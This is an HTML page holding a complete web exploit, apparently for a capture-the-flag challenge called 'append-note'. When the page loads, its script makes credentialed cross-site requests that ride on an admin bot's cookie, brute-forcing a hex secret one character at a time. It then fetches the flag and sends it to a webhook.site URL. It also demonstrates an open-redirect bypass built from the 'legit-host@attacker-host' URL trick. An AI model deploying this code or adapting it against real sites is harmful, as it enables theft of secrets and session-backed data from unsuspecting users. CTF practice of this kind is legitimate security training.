<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        // TARGET CONFIGURATION
        const CHALLENGE_HOST = 'https://append-note-1rzrc.instancer.lac.tf';
        const WEBHOOK_URL = 'https://webhook.site/fec1c809-22c7-4a31-b557-829ded3215d2';

        // EXPLOIT LOGIC
        async function attack() {
            console.log('[+] Starting attack...');

            // PHASE 1: BRUTE-FORCE THE 8-CHAR HEX SECRET
            let secret = '';
            const hexChars = '0123456789abcdef';
            
            for (let i = 0; i < 8; i++) {
                let found = false;
                
                for (let c of hexChars) {
                    const guess = secret + c;
                    const testUrl = `${CHALLENGE_HOST}/append?content=${guess}&url=/`;
                    
                    try {
                        const response = await fetch(testUrl, {
                            method: 'GET',
                            credentials: 'include' // IMPORTANT: Send admin cookie
                        });
                        
                        if (response.status === 200) {
                            secret = guess;
                            console.log(`[+] Found partial: ${secret}`);
                            found = true;
                            break;
                        }
                    } catch (err) {
                        console.error('[-] Request failed:', err);
                    }
                }
                
                if (!found) {
                    console.error('[-] Failed to brute-force character');
                    return;
                }
            }
            
            console.log(`[+] FULL SECRET: ${secret}`);

            // PHASE 2: EXFILTRATE FLAG USING OPEN REDIRECT BYPASS
            // The trick: Use malformed URL with @ to confuse hostname validation
            // Format: http://legit-host@attacker-controlled
            const attackerRedirect = `http://append-note-1rzrc.instancer.lac.tf@webhook.site/fec1c809-22c7-4a31-b557-829ded3215d2`;
            
            // First, let the bot fetch the flag with the correct secret
            const flagUrl = `${CHALLENGE_HOST}/flag?secret=${secret}`;
            
            try {
                const flagResponse = await fetch(flagUrl, {
                    credentials: 'include'
                });
                
                if (flagResponse.ok) {
                    const flagText = await flagResponse.text();
                    console.log(`[+] FLAG RESPONSE: ${flagText}`);
                    
                    // Send flag to our webhook
                    await fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flagText)}&secret=${secret}`);
                    
                    // Also trigger the open redirect (for demonstration)
                    const exploitUrl = `${CHALLENGE_HOST}/append?content=${secret}&url=${encodeURIComponent(attackerRedirect + '?stolen=' + encodeURIComponent(flagText))}`;
                    await fetch(exploitUrl, {
                        credentials: 'include'
                    });
                } else {
                    console.error('[-] Failed to get flag');
                }
            } catch (err) {
                console.error('[-] Flag exfiltration failed:', err);
            }
        }

        // Run the attack when page loads
        window.addEventListener('load', attack);
    </script>
    <h2>Exploit Running...</h2>
    <p>Check your webhook dashboard for results.</p>
</body>
</html>
